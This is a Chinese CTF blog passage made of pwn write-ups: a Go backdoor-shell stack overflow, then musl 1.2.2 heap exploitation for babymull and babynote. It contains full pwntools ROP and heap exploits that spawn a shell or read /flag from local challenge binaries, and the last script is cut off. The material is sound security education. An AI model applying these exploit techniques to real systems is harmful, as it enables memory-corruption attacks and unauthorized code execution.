/><p>在cmp时，数据全是在rax的地址获取的，也很容易看到一个规律：[rax + i]为字符串的地址，[rax + i * 8]为字符串的大小，rax寄存器之前一次改变是在调用strings_genSplit函数后，通过gdb调试发现该函数通过空格来分割字符串，rax保存字符串分割后的信息，rbx是分割的块数：</p><p>​        <img src="/img/13/Screenshot 2023-05-30 192441.png" style="zoom: 50%;" /></p><p>​<img src="/img/13/Screenshot 2023-05-30 192627.png" style="zoom:50%;" /></p><p>​</p><p>接下来很多东西都可以顺利看懂了，想进入main_unk_func0b0函数，分割的块数为3，第一个字符串为”cert”，第二个字符串为”nAcDsMicN”，第三个字符串进入main_unk_func0b0函数后再去进一步比较。接下来再进入main_unk_func0b0分析，看到crypto_rc4_NewCipher、encoding_base64__ptr_Encoding_EncodeToString这些库函数，直接去网上搜一下，这些函数就是cr4加密后再进行base64编码，，最后与”JLIX8pbSvYZu&#x2F;WaG”比较，通过这个网站就可以解密：<a href="https://www.lddgo.net/encrypt/rc4">https://www.lddgo.net/encrypt/rc4</a></p><img src="/img/13/Screenshot 2023-05-30 013458.png" style="zoom:50%;" /><p>​</p><p>输入”cert nAcDsMicN S33UAga1n@#!”后就能真正去使用这个shell，回过头去看main_unk_func0b05函数中比较的字符串，可以发现的指令有”ls”、”cd”、”cat”、”whoami”、”echo”、”exit”，其中只有”ls”和”cd”才能真正实现相应的功能，而cat匹配到flag时会输出一个假的flag(😦)，真正有用的是echo会进入main_unk_func0b04函数。</p><p>main_unk_func0b04函数中通过输入的字符串的大小（除空格）作为循环的大小，将其单个字节循环复制到栈中，这里是一个echo的栈溢出，main_unk_func0b04函数会先对每一个字符串块的大小进行检查，直接使用空格绕过即可：</p><img src="/img/13/Screenshot 2023-05-30 201147.png" style="zoom:50%;" /><p>而在临近rbp的部分存着复制过程中循环的大小与栈的相对基址，如果直接填充数据溢出的数据将其改变就会使复制数据失败，不能覆盖返回地址了，这里使用”+”这个字符可以不对让数据不复制到栈上，而循环的大小依然再增加：</p><img src="/img/13/Screenshot 2023-05-30 201330.png" style="zoom: 50%;" /><p>​</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;pwn&#x27;</span>)<br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>pop_rdi_ret = <span class="hljs-number">0x444fec</span><br>pop_rsi_ret = <span class="hljs-number">0x41e818</span><br>pop_rdx_ret = <span class="hljs-number">0x49e11d</span><br>pop_rax_ret = <span class="hljs-number">0x40d9e6</span><br>syscall_ret = <span class="hljs-number">0x4636e9</span><br>bss = <span class="hljs-number">0x5A2C88</span><br><br>p.sendlineafter(<span class="hljs-string">b&#x27;$&#x27;</span>, <span class="hljs-string">b&#x27;cert nAcDsMicN S33UAga1n@#!&#x27;</span>)<br><br>payload = p64(pop_rdi_ret) + p64(<span class="hljs-number">0</span>) + p64(pop_rsi_ret) + p64(bss) + p64(pop_rdx_ret) + p64(<span class="hljs-number">8</span>) + p64(pop_rax_ret) + p64(<span class="hljs-number">0</span>) + p64(syscall_ret)<br>payload += p64(pop_rdi_ret) + p64(bss) + p64(pop_rsi_ret) + p64(<span class="hljs-number">0</span>) + p64(pop_rdx_ret) + p64(<span class="hljs-number">0</span>) + p64(pop_rax_ret) + p64(<span class="hljs-number">0x3b</span>) + p64(syscall_ret)<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;#&#x27;</span>, <span class="hljs-string">b&#x27;echo &#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x200</span> - <span class="hljs-number">0x100</span> - <span class="hljs-number">0xd</span>) + <span class="hljs-string">b&#x27; &#x27;</span> + <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0x110</span> + <span class="hljs-string">b&#x27;+&#x27;</span> * <span class="hljs-number">0x20</span> + payload)<br>p.send(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>musl 1.2.2的两道pwn题</title>
    <link href="/2023/04/04/musl-pwn/"/>
    <url>/2023/04/04/musl-pwn/</url>
    
    <content type="html"><![CDATA[<p>musl 1.2.2堆的内存管理与以前学的glibc完全不同，是将一块连续的内存划分为相同的大小的chunk（有点像slab），再去由group、meta、malloc_context这些结构体逐级去管理，推荐大家多看几遍0xRGz师傅的musl源码解析<a href="https://bbs.kanxue.com/thread-269533-1.htm#msg_header_h3_8">文章</a>，这里主要写的是自己在复现musl pwn题中所学到的一些细节。</p><p>​                                                     </p><h3 id="前置要点"><a href="#前置要点" class="headerlink" title="前置要点"></a>前置要点</h3><h4 id="分配策略"><a href="#分配策略" class="headerlink" title="分配策略"></a>分配策略</h4><p>需要记住的是<strong>刚释放的chunk不会被立刻使用</strong>：</p><ul><li>在同一的group中，如果avail_mask不为0，如果释放一个该group中的chunk，接下来申请chunk也只会优先申请那些被avail_mask标识的，而不会去使用刚释放的；</li><li>如果avail_mask 为0，就会去找meta-&gt;next所指向的meta，调用activate_group函数更新下一个meta的avail_mask，接着去使用下一个meta中的chunk，同时将下一个meta更新为链表头。</li></ul><p>​                                                                      </p><h4 id="dequeue"><a href="#dequeue" class="headerlink" title="dequeue"></a>dequeue</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">dequeue</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> meta **phead, <span class="hljs-keyword">struct</span> meta *m)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (m-&gt;next != m) &#123;<br>        m-&gt;prev-&gt;next = m-&gt;next;<br>        m-&gt;next-&gt;prev = m-&gt;prev;<br>        <span class="hljs-keyword">if</span> (*phead == m) *phead = m-&gt;next;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        *phead = <span class="hljs-number">0</span>;<br>    &#125;<br>    m-&gt;prev = m-&gt;next = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>dequeue</strong> 触发条件：</p><ul><li><p>avail_mask 表示只有一个chunk 被使用 ，freed_mask &#x3D; 0，而free刚好要free 一个chunk；</p></li><li><p>avail_mask &#x3D; 0, freed_mask表示只有1个 chunk没被释放，这时释放的chunk就是最后一个chunk；</p></li><li><p>avail_mask &#x3D; 0, freed_mask &#x3D; 0，且继续申请该大小的chunk，这时就会unlink此meta，使用新的meta分配。</p></li></ul><p>​                                                               </p><h4 id="queue"><a href="#queue" class="headerlink" title="queue"></a>queue</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">queue</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> meta **phead, <span class="hljs-keyword">struct</span> meta *m)</span><br>&#123;<br>assert(!m-&gt;next);<br>assert(!m-&gt;prev);<br><span class="hljs-keyword">if</span> (*phead) &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">meta</span> *<span class="hljs-title">head</span> =</span> *phead;<br>m-&gt;next = head;<br>m-&gt;prev = head-&gt;prev;<br>m-&gt;next-&gt;prev = m-&gt;prev-&gt;next = m;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>m-&gt;prev = m-&gt;next = m;<br>*phead = m;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>queue</strong> 触发条件：</p><p>avail_mask &#x3D; 0， freed_mask &#x3D; 0，释放其中的一个chunk（当然该meta已经是dequeue的）。</p><p>​                                                                          </p><h3 id="祥云杯2021-babymull"><a href="#祥云杯2021-babymull" class="headerlink" title="祥云杯2021 babymull"></a>祥云杯2021 babymull</h3><p>这里是直接参考的这篇<a href="https://mp.weixin.qq.com/s/UwrZVlQ_WJ5rO4InOErt1g">wp</a>。</p><p>最主要的就是通过后门函数去泄漏malloc_context的secret，修改chunk的offset，让其找到伪造的group，再通过伪造的group找到伪造的meta，queue伪造的meta，最后修改伪造的meta-&gt;mem地址，实现任意地址写。</p><p>​</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;babymull&#x27;</span>)<br>libc = elf.libc<br>p = process(<span class="hljs-string">&#x27;./babymull&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, content, name = <span class="hljs-string">b&#x27;a&#x27;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">b&#x27;Name:&#x27;</span>, name)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gift</span>(<span class="hljs-params">set_null, leak</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x73317331</span>).encode())<br>    p.sendline(<span class="hljs-built_in">str</span>(set_null).encode())<br>    p.sendline(<span class="hljs-built_in">str</span>(leak).encode())<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    add(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span> + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x1000</span>, <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x1000</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x238</span> + p32(<span class="hljs-number">5</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0xf</span>)<br>show(<span class="hljs-number">5</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = leak + <span class="hljs-number">0x2aa0</span><br><br>mmap_addr = libc_base - <span class="hljs-number">0x4000</span><br>stdin = libc_base + libc.sym[<span class="hljs-string">&#x27;__stdin_FILE&#x27;</span>]<br>stdout = libc_base + libc.sym[<span class="hljs-string">&#x27;__stdout_FILE&#x27;</span>]<br>malloc_context = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_context&#x27;</span>]<br>gadget = libc_base + <span class="hljs-number">0x4bcf3</span><br>pop_rdi_ret = libc_base + <span class="hljs-number">0x15536</span><br>pop_rsi_ret = libc_base + <span class="hljs-number">0x1b3a9</span><br>pop_rdx_ret = libc_base + <span class="hljs-number">0x177c7</span><br>ret = pop_rdi_ret + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br><br>gift(leak - <span class="hljs-number">8</span> + <span class="hljs-number">6</span>, malloc_context)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>secret = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>), <span class="hljs-number">16</span>)<br><br>delete(<span class="hljs-number">0</span>)<br>fake_meta = mmap_addr + <span class="hljs-number">0x1000</span> + <span class="hljs-number">8</span><br>fake_group = mmap_addr + <span class="hljs-number">0x550</span><br><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x520</span> + p64(fake_meta)<br>payload = payload.ljust(<span class="hljs-number">0xfd0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(secret)<br>payload += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(fake_group)<br>payload += p64(<span class="hljs-number">0</span>)<br>payload += p64((<span class="hljs-number">24</span> &lt;&lt; <span class="hljs-number">6</span>) + <span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x1000</span>, payload)<br>delete(<span class="hljs-number">5</span>)<br><br>delete(<span class="hljs-number">0</span>)<br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0xfc0</span> + p64(secret) + p64(mmap_addr + <span class="hljs-number">0x1008</span>) * <span class="hljs-number">2</span> + p64(stdout - <span class="hljs-number">0x20</span>) + p64(<span class="hljs-number">3</span>) + p64((<span class="hljs-number">24</span> &lt;&lt; <span class="hljs-number">6</span>) + <span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x1000</span>, payload + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br>libc.address = libc_base<br>payload = flat([<br>    pop_rdi_ret, mmap_addr + <span class="hljs-number">0x2000</span>,<br>    pop_rsi_ret, <span class="hljs-number">0x1000</span>,<br>    pop_rdx_ret, <span class="hljs-number">7</span>,<br>    libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>],<br>    mmap_addr + <span class="hljs-number">0x2aa0</span> + <span class="hljs-number">0x40</span><br>])<br>payload += asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>) + shellcraft.read(<span class="hljs-string">&#x27;rax&#x27;</span>, mmap_addr, <span class="hljs-number">0x30</span>) + shellcraft.write(<span class="hljs-number">1</span>, mmap_addr, <span class="hljs-number">0x30</span>))<br>add(<span class="hljs-number">0x1000</span>, payload + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">1</span>) + p64(mmap_addr + <span class="hljs-number">0x2aa0</span>) + p64(ret) + p64(<span class="hljs-number">0</span>) + p64(gadget) + <span class="hljs-string">b&#x27;\n&#x27;</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;Name:&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x800</span>).encode())<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, payload)<br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><p>​</p><p>​</p><p>这里引用另一个师傅的<a href="https://brooke-hub.github.io/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/">文章</a>关于此题的疑问，自己复现时也有过同样的疑问</p><img src="/img/12/Screenshot 2023-04-04 221257.png" style="zoom: 67%;" /><p>​                                                            </p><p>疑问1：<strong>可以直接申请到stdout_FILE是因为avail_mask设置为2，其表示的是第一个chunk已经被标识为不可分配，第二个chunk则是可以分配，所以就直接越过中间0x940，分配第二个chunk；如果avail_mask设置为3或者1，则就可以正常从头开始分配</strong>。</p><p>疑问2：<strong>是绕过free的检查，更详细点就是get_nominal_size函数中关于chunk边界的检查</strong></p><img src="/img/12/Screenshot 2023-04-04 225810.jpg" style="zoom: 80%;" /><p>​                                                                   </p><h3 id="CTF2022-babynote"><a href="#CTF2022-babynote" class="headerlink" title="*CTF2022 babynote"></a>*CTF2022 babynote</h3><p>这里是参考xyzmpv师傅的<a href="https://blog.csdn.net/weixin_45209963/article/details/124423573">wp</a></p><p>具体细节就不再赘述，需要注意在calloc函数中使用malloc分配内存后会继续调用is_allzero函数，而在is_allzero函数中又存在get_meta函数去检查所分配的内存块，需要先dequeue去将目标内存的group改为正确的内存地址，之后才能正常分配目标地址。</p><p>​                </p><p>利用dequeue去攻击，除了伪造prev,、next、avail_mask、 freed_mask这些值，<strong>freeable和maplen也不能忽视</strong>。</p><p>只有freeable &#x3D; 1时，meta才能被dequeue。</p><p>当maplen &#x3D; 0时，说明group不是新mmap 出来的，而是使用其他meta里的group；使用最简单的代码就能证明这一点：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> *p = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>    <span class="hljs-built_in">free</span>(p);<br>&#125;<br></code></pre></td></tr></table></figure><p>在malloc(0x20)之前是没有相应0x30大小的group</p><img src="/img/12/Screenshot 2023-04-05 120207.png" style="zoom: 67%;" /><p>​</p><p>在malloc后可以观察到active[2]的group实际上是直接从active[15]中分配的chunk</p><img src="/img/12/Screenshot 2023-04-05 120251.jpg" style="zoom:67%;" /><p>而在利用dequeue去攻击时，如果设置maplen为0，在dequeue之后就会调用free_group函数，然后就使用get_meta对伪造的group还要做一系列检查，最后再去调用nontrivial_free函数，这就对伪造的group和meta有更多的要求，引起不必要的麻烦。</p><img src="/img/12/Screenshot 2023-04-04 232505.jpg" style="zoom: 80%;" /><p>​</p><p>由于自己本地使用的是musl_1.2.2-4，对这道题给的libc无法正常使用带符号调试(也不确定是不是这个原因导致的)，为了方便自己做题就直接拿本地的libc去做了，下面exp仅供参考</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;babynote&#x27;</span>)<br>libc = elf.libc<br>p = process(<span class="hljs-string">&#x27;./babynote&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size0, content0, size1, content1</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;option:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size:&#x27;</span>, <span class="hljs-built_in">str</span>(size0).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, content0)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size:&#x27;</span>, <span class="hljs-built_in">str</span>(size1).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;content:&#x27;</span>, content1)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find</span>(<span class="hljs-params">size, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;option:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">size, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;option:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, content)<br><br><span class="hljs-comment">#由于本地的group没有在libc附近的，所以事先分配大量的chunk，让group分配到libc附近</span><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    add(<span class="hljs-number">0x200</span>, <span class="hljs-string">b&#x27;aaaaaaaa\n&#x27;</span>, <span class="hljs-number">0x200</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br><br>add(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span>, <span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;option:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    find(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br><br>add(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0x38</span>, <span class="hljs-number">0x28</span>, <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;c&#x27;</span> * <span class="hljs-number">0x38</span>, <span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;c&#x27;</span> * <span class="hljs-number">0x38</span>)<br>delete(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0x38</span>)<br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    find(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>add(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;d&#x27;</span> * <span class="hljs-number">0x38</span>, <span class="hljs-number">0x200</span>, <span class="hljs-string">b&#x27;d\n&#x27;</span>)<br>find(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0x38</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x28:&#x27;</span>)<br><br>elf_base = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    elf_base += <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">2</span>), <span class="hljs-number">16</span>) &lt;&lt; (i * <span class="hljs-number">8</span>)<br>elf_base -= <span class="hljs-number">0x7d10</span><br>libc_base = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    libc_base += <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">2</span>), <span class="hljs-number">16</span>) &lt;&lt; (i * <span class="hljs-number">8</span>)<br>libc_base += <span 